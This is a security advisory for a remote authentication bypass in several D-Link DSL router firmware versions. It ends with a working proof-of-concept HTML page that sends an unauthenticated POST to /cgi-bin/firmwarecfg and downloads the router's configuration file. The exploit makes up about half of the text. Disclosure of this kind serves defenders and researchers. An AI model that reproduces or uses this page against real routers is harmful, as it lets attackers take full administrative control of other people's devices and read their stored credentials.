source: https://www.securityfocus.com/bid/13679/info

Various D-Link DSL routers are susceptible to a remote authentication bypass vulnerability. This issue is due to a failure of the devices to require authentication in certain circumstances.

This vulnerability allows remote attackers to gain complete administrative access to affected devices.

Various D-Link devices with the following firmware revisions are affected by this issue:
- V1.00B01T16.EN.20040211
- V1.00B01T16.EU.20040217
- V0.00B01T04.UK.20040220
- V1.00B01T16.EN.20040226
- V1.00B02T02.EU.20040610
- V1.00B02T02.UK.20040618
- V1.00B02T02.EU.20040729
- V1.00B02T02.DE.20040813
- V1.00B02T02.RU.20041014

Due to the common practice of code reuse, other devices are also likely affected by this issue. 

<html><head>Download config.xml:<title>GetConfig - Config file
download</title></head><body>

<script lang="javascript">
function invia_richiesta()
{
document.DownloadConfig.action='http://'+document.InputBox.Host.value+'/cgi-bin/firmwarecfg';
document.DownloadConfig.submit();
}
</script>

<form name="InputBox">
<br>http://<input Name="Host" type="text" value="">/cgi-bin/firmwarecfg<br>
</form>
<form name="DownloadConfig" method="POST" action=""
enctype="multipart/form-data">
<input type="Submit" name="config" value="Download"
onClick="javascript:invia_richiesta();"><br>
</form></body></html>